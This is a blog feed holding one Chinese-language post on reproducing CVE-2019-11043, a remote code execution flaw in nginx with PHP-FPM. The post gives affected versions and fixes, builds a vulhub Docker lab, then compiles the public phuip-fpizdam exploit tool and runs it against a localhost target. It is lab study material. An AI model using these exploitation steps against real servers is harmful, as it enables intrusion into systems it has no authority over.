<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>spaceman&#39;blog</title>
  
  
  <link href="https://spaceman-911.github.io/atom.xml" rel="self"/>
  
  <link href="https://spaceman-911.github.io/"/>
  <updated>2021-02-10T14:56:41.290Z</updated>
  <id>https://spaceman-911.github.io/</id>
  
  <author>
    <name>spaceman</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-11043漏洞复现</title>
    <link href="https://spaceman-911.github.io/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://spaceman-911.github.io/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-02-10T14:35:18.000Z</published>
    <updated>2021-02-10T14:56:41.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-11043漏洞复现"><a href="#CVE-2019-11043漏洞复现" class="headerlink" title="CVE-2019-11043漏洞复现"></a>CVE-2019-11043漏洞复现</h1><h2 id="0x01漏洞简介"><a href="#0x01漏洞简介" class="headerlink" title="0x01漏洞简介"></a>0x01漏洞简介</h2><p> nginx + php-fpm 配置不当，当nginx配置文件中有<code>fastcgi_split_path_info</code>，却没有<code>if(!-f $document_root$fastcgi_script_name)&#123;return 404;&#125;</code>的时候就会导致远程代码执行。 </p><p> 向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。 </p><p> 该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^&#x2F;]\.php(&#x2F;|$) &#123;</span><br><span class="line">...</span><br><span class="line">fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br><span class="line">fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">fastcgi_pass   php:9000;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。 </p><p>影响版本：</p><ul><li> PHP 7.0 版本</li><li> PHP 7.1 版本</li><li> PHP 7.2 版本</li><li> PHP 7.3 版本 </li></ul><p>修复建议：</p><ul><li>PHP 7.1.X更新至7.1.33</li><li>PHP 7.2.X更新至7.2.24</li><li>PHP 7.3.X更新至7.3.11 </li></ul><h2 id="0x02环境搭建"><a href="#0x02环境搭建" class="headerlink" title="0x02环境搭建"></a>0x02环境搭建</h2><p>系统：kali</p><h3 id="安装-docker、golang-环境"><a href="#安装-docker、golang-环境" class="headerlink" title="安装 docker、golang 环境"></a>安装 docker、golang 环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br><span class="line">sudo apt install golang</span><br></pre></td></tr></table></figure><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br><span class="line">cd vulhub&#x2F;php&#x2F;CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020429046.png" alt="image-20201225020429046"></p><p>查看docker环境：</p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020545973.png" alt="image-20201225020545973"></p><p>访问8080端口，成功如下</p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020623594.png" alt="image-20201225020623594"></p><h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="安装漏洞利用工具"><a href="#安装漏洞利用工具" class="headerlink" title="安装漏洞利用工具"></a>安装漏洞利用工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.git</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line">go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cn</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure><p>默认使用的是proxy.golang.org，在国内无法访问，所以换了一个国内能访问的代理地址：<a href="https://goproxy.cn/">https://goproxy.cn</a> </p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225020830346.png" alt="image-20201225020830346"></p><h3 id="工具攻击"><a href="#工具攻击" class="headerlink" title="工具攻击"></a>工具攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;phuip-fpizdam http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php</span><br></pre></td></tr></table></figure><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225021123226.png" alt="image-20201225021123226"></p><p>成功利用，参数名为a</p><p><img src="/2021/02/10/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201225021301464.png" alt="image-20201225021301464"></p><h2 id="0x04参考链接："><a href="#0x04参考链接：" class="headerlink" title="0x04参考链接："></a>0x04参考链接：</h2><p><a href="https://blog.csdn.net/weixin_43606134/article/details/107646467">https://blog.csdn.net/weixin_43606134/article/details/107646467</a></p><p><a href="https://blog.csdn.net/qq_43342566/article/details/102733144">https://blog.csdn.net/qq_43342566/article/details/102733144</a></p><p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/111225967">https://blog.csdn.net/weixin_40412037/article/details/111225967</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2019-11043漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-11043漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-11043漏洞复现&quot;&gt;&lt;/a&gt;CVE-2019-11043漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;0</summary>
      
    
    
    
    
    <category term="CVE" scheme="https://spaceman-911.github.io/tags/CVE/"/>
    
  </entry>
  
</feed>
